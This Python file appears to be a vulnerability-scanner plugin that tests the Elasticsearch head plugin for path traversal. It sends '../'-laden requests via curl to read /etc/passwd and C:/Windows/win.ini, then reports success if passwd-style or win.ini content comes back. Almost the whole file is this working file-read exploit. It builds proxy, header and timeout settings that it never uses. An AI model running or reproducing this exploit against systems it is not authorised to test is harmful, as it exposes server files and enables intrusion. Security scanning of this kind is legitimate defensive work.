import re
import subprocess

def check(url,proxies):
    if proxies:
        proxies = {proxies['protocol']: proxies['protocol'] + '://' + proxies['ip'] + ':' + str(proxies['port'])}
    try:
        ret = {'success': False, 'response': [], 'requests': [], 'error': [], 'info': []}
        payload="/_plugin/head/../../../../../../../../../etc/passwd"
        payload2='/_plugin/head/../../../../../../../../../C:/Windows/win.ini'
        popen1 = subprocess.Popen(['curl', '-v', '--path-as-is', f'{url}{payload}'],
                                 stdout=subprocess.PIPE)
        popen2 = subprocess.Popen(['curl', '-v', '--path-as-is', f'{url}{payload2}'],
                                  stdout=subprocess.PIPE)
        data1=popen1.stdout.read().decode('UTF-8')
        data2=popen2.stdout.read().decode('UTF-8')
        result = re.findall('(.*?:\w+:\d+:\d+:.*?:[\/\w+]*:[\/\w+]*|\[fonts\])',data1,re.DOTALL)
        result2 = re.findall('(.*?:\w+:\d+:\d+:.*?:[\/\w+]*:[\/\w+]*|\[fonts\])',data2,re.DOTALL)
        print(result)
        if result or result2:
            ret['success']=True
    
    except Exception as e :
        print(e)

    return ret

def main(params):
    result = params.get('result', {})
    url = params.get('url', '')
    headers = params.get('headers', {})
    proxies = params.get('proxies', None)  # 代理
    timeout = params.get('timeout', 5)  # 超时时间
    result = check(url, proxies)
    return result


if __name__ == '__main__':
    params = {
        'result': {'success': False, 'response': [], 'requests': [], 'error': []},
        # headers：传入的header参数
        'headers': {},
        # proxy：传入的代理服务器参数
        'proxies': {'protocol': 'http', 'ip': '127.0.0.1', 'port': 8080},
        'timeout': 30,
        ###可选参数###
        'url': "http://127.0.0.1:9200",
    }
    print(main(params))
